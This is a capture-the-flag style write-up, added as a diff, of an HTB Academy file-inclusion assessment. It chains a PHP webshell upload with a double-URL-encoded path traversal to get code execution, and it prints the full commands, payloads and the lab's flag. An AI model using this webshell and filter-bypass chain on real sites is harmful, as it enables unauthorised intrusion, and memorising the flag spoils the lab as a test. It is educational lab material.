@@ -1,0 +1,187 @@
+---
+layout: writeup
+title: "Sumace Consulting - File Inclusion Skills Assessment"
+date: 2026-03-26
+
+platform: HTB Academy
+difficulty: Medium
+os: Linux
+status: Retired
+
+stuck_summary: "Spent ages trying to get a reverse shell before realising the container was network isolated — just read the flag directly via the webshell"
+
+tags:
+  - linux
+  - lfi
+  - file-upload
+  - double-url-encoding
+  - php-webshell
+  - ffuf
+  - md5
+  - php
+---
+
+## TL;DR
+
+```bash
+# Fuzz for vulnerable parameters
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://ATTACK_IP/index.php?FUZZ=value' -fs 2309
+
+# Create webshell — syntax must be exact
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Get MD5 hash — this becomes the filename on the server
+md5sum shell.php
+
+# Upload via apply.php form
+curl -X POST "http://ATTACK_IP/api/application.php" \
+  -F "firstName=John" \
+  -F "lastName=Doe" \
+  -F "email=john@test.com" \
+  -F "file=@shell.php" \
+  -F "notes=test"
+
+# Trigger RCE via double encoded LFI — replace MD5HASH with your hash
+curl "http://ATTACK_IP/contact.php?region=%252E%252E%252Fuploads%252FMD5HASH&cmd=cat%20/flag.txt"
+```
+
+---
+
+## Given Info
+
+**Box description:** A PHP web application for a consulting firm (Sumace Consulting) with a file upload feature and an LFI vulnerability protected by input filtering. The goal is to chain the upload with the LFI to achieve remote code execution and read the flag.
+
+**Recommended modules:**
+- File Inclusions
+- File Upload Attacks
+
+---
+
+## Where I Got Stuck
+
+- **Chased a reverse shell that could never work** — spent a long time trying to get a reverse shell before realising the container is network isolated. There's no outbound connectivity. Just read the flag directly via the webshell `cmd` parameter.
+- **Silent syntax error in shell.php** — shell wasn't executing at all. Turned out to be a missing `)` in `system($_GET["cmd"]`. The upload succeeded but the PHP was broken. Always verify your webshell syntax before uploading.
+- **Single URL encoding still blocked** — `%2E%2E%2F` gets decoded once by the server before the filter runs, so it still sees `../` and blocks it. Double encoding (`%252E%252E%252F`) bypasses this because the filter sees encoded characters, not the traversal pattern.
+- **Wrong LFI wordlist approach** — wasted time fuzzing LFI paths on `region=` with a wordlist. Every response came back the same size. The LFI only works when pointing at the uploaded shell — it's not a general path traversal.
+
+---
+
+## Enumeration
+
+### ffuf — Parameter Fuzzing
+
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://ATTACK_IP/index.php?FUZZ=value' -fs 2309
+```
+
+**Results:**
+- `contact.php?region=` returned a different response size — confirmed as a vulnerable parameter
+
+### Manual Recon
+
+Viewing the homepage source revealed:
+
+```
+api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c
+```
+
+A 32-character hex string in the image path — that's an MD5 hash. This tells you the server renames uploaded files to their MD5 hash. You can predict exactly where your shell will land after uploading.
+
+**Other findings:**
+- `apply.php` — file upload form posting to `/api/application.php`
+- `contact.php?region=` — filters `../` and special characters, returns "parameter contains invalid character(s)"
+
+---
+
+## Attack Plan
+
+### Option A: Single URL Encoding ✗
+
+**What you tried:**
+```bash
+curl "http://ATTACK_IP/contact.php?region=%2E%2E%2Fuploads%2FMD5HASH&cmd=id"
+```
+
+**Result:**
+```
+'region' parameter contains invalid character(s)
+```
+
+**Why it failed:** The server decodes the URL once before passing it to the filter. So `%2E%2E%2F` becomes `../` and gets caught. One layer of encoding isn't enough.
+
+---
+
+### Option B: Double URL Encoding + MD5 Shell ✓
+
+**Why this works:** Double encoding means the filter receives `%2E%2E%2F` (still encoded) and passes it through. PHP then decodes it a second time to `../` during file inclusion — after the filter has already run.
+
+**Step 1 — Create the webshell**
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+md5sum shell.php
+```
+
+```
+fcb513f761ea59d2e6c1e6ab120ca650  shell.php
+```
+
+This hash is your uploaded filename. Save it.
+
+> Syntax check: `<?php system($_GET["cmd"]); ?>` — note the closing `)` and `;`. A missing character here breaks execution silently.
+
+**Step 2 — Upload via the application form**
+
+```bash
+curl -X POST "http://ATTACK_IP/api/application.php" \
+  -F "firstName=John" \
+  -F "lastName=Doe" \
+  -F "email=john@test.com" \
+  -F "file=@shell.php" \
+  -F "notes=test"
+```
+
+```
+Upload accepted
+```
+
+**Step 3 — Confirm RCE via double encoded traversal**
+
+```bash
+curl "http://ATTACK_IP/contact.php?region=%252E%252E%252Fuploads%252Ffcb513f761ea59d2e6c1e6ab120ca650&cmd=id"
+```
+
+```
+www-data
+```
+
+RCE confirmed.
+
+**Step 4 — Read the flag**
+
+```bash
+curl "http://ATTACK_IP/contact.php?region=%252E%252E%252Fuploads%252Ffcb513f761ea59d2e6c1e6ab120ca650&cmd=cat%20/flag.txt"
+```
+
+Flag retrieved as `www-data`.
+
+> Tried to get a reverse shell here — don't bother. The container has no outbound network access. Read the flag directly via `cmd=cat%20/flag.txt`.
+
+---
+
+## Post Exploitation / Privilege Escalation
+
+Not applicable — flag was readable as `www-data` directly. No privesc path available in this isolated container environment.
+
+---
+
+## Flags
+
+<details>
+<summary>🚩 Flag — click to reveal</summary>
+
+eedbb78d4800aa45573840ed6bd2d1e3
+
+</details>
